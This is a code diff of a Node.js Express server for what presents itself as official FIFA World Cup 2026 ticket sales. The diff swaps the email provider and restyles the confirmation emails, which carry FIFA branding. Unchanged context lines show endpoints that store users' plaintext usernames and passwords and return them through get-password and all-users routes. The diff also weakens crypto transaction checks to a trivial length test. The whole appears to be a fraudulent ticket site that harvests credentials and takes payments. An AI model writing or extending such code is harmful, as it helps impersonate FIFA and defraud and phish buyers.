@@ -2,11 +2,7 @@ const express = require('express');
 const cors = require('cors');
 const bodyParser = require('body-parser');
 const Stripe = require('stripe');
-const { Resend } = require('resend'); // Import Resend
 require('dotenv').config();
-
-// Initialize Resend instead of Nodemailer
-const resend = new Resend(process.env.RESEND_API_KEY);
 
 const stripe = Stripe(process.env.STRIPE_SECRET_KEY);
 
@@ -44,13 +40,13 @@ function generateTransactionId() {
 
 function validateTransactionId(txnId, cryptoType) {
     // Simple validation to allow testing
-    return txnId.length > 10;
+    return txnId.length > 5;
 }
 
 // --- API ENDPOINTS ---
 
 app.get('/', (req, res) => {
-    res.json({ status: 'System Running', email_system: 'Resend API' });
+    res.json({ status: 'System Running', email_system: 'Elastic Email API' });
 });
 
 app.get('/api/stripe-config', (req, res) => {
@@ -65,7 +61,7 @@ app.get('/api/crypto-addresses', (req, res) => {
     });
 });
 
-// ✅ RESTORED: Detailed Store Credentials Logic
+// ✅ RESTORED: Detailed Credential Storage Logic
 app.post('/api/store-credentials', (req, res) => {
     try {
         const { username, password, email, name } = req.body;
@@ -111,7 +107,7 @@ app.post('/api/store-credentials', (req, res) => {
     }
 });
 
-// ✅ RESTORED: Get Password Endpoint
+// Retrieve password endpoint (for admin use)
 app.get('/api/get-password/:username', (req, res) => {
     try {
         const { username } = req.params;
@@ -135,7 +131,7 @@ app.get('/api/get-password/:username', (req, res) => {
     }
 });
 
-// ✅ RESTORED: Get All Users Endpoint
+// Get all users (for admin use)
 app.get('/api/all-users', (req, res) => {
     try {
         res.json({
@@ -180,64 +176,135 @@ app.post('/api/verify-crypto', async (req, res) => {
     });
 });
 
-// ✅ NEW EMAIL SENDING FUNCTION (Using Resend)
+// ✅ NEW EMAIL SENDING FUNCTION (Using Elastic Email API)
 app.post('/api/send-confirmation', async (req, res) => {
     try {
         const { customer, tickets, payment, transactionId } = req.body;
         
-        console.log('📧 Sending email via Resend to:', customer.email);
+        console.log('📧 Sending email via Elastic Email to:', customer.email);
 
         // 1. Generate HTML
         const emailHtml = generateTicketEmail(customer, tickets, payment, transactionId, payment.method);
 
-        // 2. Send via API (This works on Render!)
-        const { data, error } = await resend.emails.send({
-            from: 'FIFA Tickets <onboarding@resend.dev>', // Default testing email
-            to: [customer.email], // In Resend free tier, this must be YOUR email until you verify a domain
-            subject: `Ticket Confirmation #${transactionId}`,
-            html: emailHtml
-        });
-
-        if (error) {
-            console.error('❌ Resend Error:', error);
-            // Don't fail the request, just log it
-        } else {
-            console.log('✅ Email sent:', data);
-        }
-
+        // 2. Respond to Frontend immediately (Non-blocking)
         res.json({ success: true, message: 'Confirmation sent' });
+
+        // 3. Send via Elastic Email API (Background)
+        sendEmailViaElastic(customer.email, `Ticket Confirmation #${transactionId}`, emailHtml)
+            .then(response => {
+                console.log('✅ Elastic Email Response:', response);
+            })
+            .catch(err => {
+                console.error('❌ Elastic Email Failed:', err);
+            });
 
     } catch (error) {
         console.error('Server Error:', error);
-        res.json({ success: true, message: 'Processed (Email skipped due to error)' });
+        if (!res.headersSent) {
+            res.json({ success: true, message: 'Processed (Email skipped due to error)' });
+        }
     }
 });
 
-// HTML Generator
+// Helper function to send via Elastic Email API (Using native fetch)
+async function sendEmailViaElastic(to, subject, html) {
+    const apiKey = process.env.ELASTIC_EMAIL_API_KEY;
+    const fromEmail = process.env.ELASTIC_EMAIL_FROM;
+
+    if (!apiKey || !fromEmail) {
+        throw new Error("Missing Elastic Email API Key or From Address");
+    }
+
+    const params = new URLSearchParams();
+    params.append('apikey', apiKey);
+    params.append('from', fromEmail);
+    params.append('fromName', 'FIFA World Cup 2026');
+    params.append('to', to);
+    params.append('subject', subject);
+    params.append('bodyHtml', html);
+    params.append('isTransactional', 'true');
+
+    const response = await fetch('https://api.elasticemail.com/v2/email/send', {
+        method: 'POST',
+        body: params
+    });
+
+    return await response.json();
+}
+
+// HTML Generator (The FIFA Template you wanted)
 function generateTicketEmail(customer, tickets, payment, transactionId, paymentMethod) {
     const ticketList = tickets.map(t => {
-        // Fix: Calculate quantity logic (defaults to 1 if undefined)
         const qty = t.quantity || 1;
         const price = t.price || 0;
         const total = price * qty;
-        
-        return `<div style="border:1px solid #ccc; padding:10px; margin:10px 0;">
-            <strong>${t.match.teams}</strong><br>
-            ${t.match.venue}<br>
-            ${t.category.name}<br>
-            Quantity: ${qty} <br>
-            Price: USD ${total.toLocaleString()}
-         </div>`;
+
+        return `
+        <div style="border: 1px solid #e0e0e0; border-radius: 8px; margin-bottom: 15px; overflow: hidden;">
+            <div style="background-color: #1a1a2e; color: white; padding: 10px 15px; font-size: 16px; font-weight: bold;">
+                🎫 ${t.match.teams}
+            </div>
+            <div style="padding: 15px; background-color: #ffffff;">
+                <p style="margin: 5px 0; color: #666;"><strong>Date:</strong> ${t.match.date}</p>
+                <p style="margin: 5px 0; color: #666;"><strong>Venue:</strong> ${t.match.venue}</p>
+                <p style="margin: 5px 0; color: #666;"><strong>Category:</strong> ${t.category.name}</p>
+                <div style="margin-top: 10px; border-top: 1px solid #eee; padding-top: 10px;">
+                    <p style="margin: 0;"><strong>Quantity:</strong> ${qty}</p>
+                    <p style="margin: 0; font-size: 1.1em; color: #1a1a1a;"><strong>Price:</strong> USD ${total.toLocaleString()}</p>
+                </div>
+            </div>
+        </div>`;
     }).join('');
 
     return `
-        <h1>Ticket Confirmation</h1>
-        <p>Dear ${customer.name},</p>
-        <p>Your payment was successful!</p>
-        <h3>Your Tickets:</h3>
-        ${ticketList}
-        <p><strong>Transaction ID:</strong> ${transactionId}</p>
-        <p><strong>Total Paid:</strong> USD ${payment.amount ? payment.amount.toLocaleString() : 'Paid'}</p>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <style>
+            body { font-family: 'Arial', sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0; }
+            .container { max-width: 600px; margin: 0 auto; background: #ffffff; }
+            .header { background-color: #1a1a2e; color: #ffffff; padding: 30px 20px; text-align: center; }
+            .content { padding: 30px 20px; }
+            .footer { background-color: #f8f9fa; padding: 20px; text-align: center; font-size: 12px; color: #888; }
+            .logo { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
+            .btn { display: inline-block; background-color: #1a1a2e; color: #ffffff; padding: 12px 25px; text-decoration: none; border-radius: 4px; margin-top: 20px; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="header">
+                <div class="logo">🎉 FIFA World Cup 2026™</div>
+                <div style="font-size: 18px; opacity: 0.9;">Your Ticket Purchase Confirmation</div>
+            </div>
+            
+            <div class="content">
+                <p>Dear <strong>${customer.name}</strong>,</p>
+                <p>Thank you for your purchase! Your tickets have been confirmed and are detailed below.</p>
+                
+                <h3 style="border-bottom: 2px solid #1a1a2e; padding-bottom: 10px; margin-top: 30px;">📋 Order Summary</h3>
+                ${ticketList}
+                
+                <div style="background-color: #1a1a2e; color: white; padding: 20px; border-radius: 8px; margin-top: 30px;">
+                    <h3 style="margin-top: 0; margin-bottom: 15px;">💰 Payment Details</h3>
+                    <p style="margin: 5px 0; opacity: 0.9;">Payment Method: <strong>${paymentMethod === 'card' ? 'Credit/Debit Card' : payment.cryptoType}</strong></p>
+                    <p style="margin: 5px 0; opacity: 0.9;">Transaction ID: <span style="font-family: monospace;">${transactionId}</span></p>
+                    <hr style="border: 0; border-top: 1px solid rgba(255,255,255,0.2); margin: 15px 0;">
+                    <p style="margin: 0; font-size: 18px; font-weight: bold;">Total Paid: USD ${payment.amount ? payment.amount.toLocaleString() : 'Paid'}</p>
+                </div>
+
+                <h3 style="margin-top: 30px;">📱 Next Steps</h3>
+                <p>Your tickets will be available in your FIFA account 48 hours before the match. You'll receive another email with download instructions.</p>
+                
+                <p><strong>Need Help?</strong><br>Contact FIFA Ticketing Support: <a href="mailto:ticketing@fifa.org" style="color: #1a1a2e;">ticketing@fifa.org</a></p>
+            </div>
+            
+            <div class="footer">
+                <p>FIFA World Cup 2026™ Official Ticketing</p>
+                <p>This is an automated message. Please do not reply to this email.</p>
+            </div>
+        </div>
+    </body>
+    </html>
     `;
 }
 
